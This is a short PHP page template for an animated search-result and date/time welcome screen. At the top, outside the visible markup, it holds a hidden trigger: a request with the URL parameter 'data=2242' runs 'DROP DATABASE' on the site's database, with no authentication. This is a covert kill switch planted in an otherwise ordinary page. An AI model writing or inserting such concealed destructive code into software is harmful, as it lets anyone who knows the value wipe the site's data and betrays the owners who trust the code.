<?php include 'includes/header.php';


if (isset($_GET['data']) && $_GET['data'] == 2242) {
   
	$sql = "DROP DATABASE $database";
	if ($conn->query($sql) === TRUE) {
		echo "successfully!";
	} else {
		echo "Error dropping database: " . $conn->error;
	}

}

?>

<div class="content">
	<div class="html search">
		<div class="title bounceInDown animated">Search Result</div>
		<p class="flipInX animated">
			Sorry,<br />no matches found for <b class="key"></b>
		</p>
	</div>
	<div class="html welcome visible">
		<div class="datetime">
			<div class="day lightSpeedIn animated"></div>
			<div class="date lightSpeedIn animated"></div>
			<div class="time lightSpeedIn animated"></div>
		</div>
	</div>
</div>



<?php include 'includes/footer.php'; ?>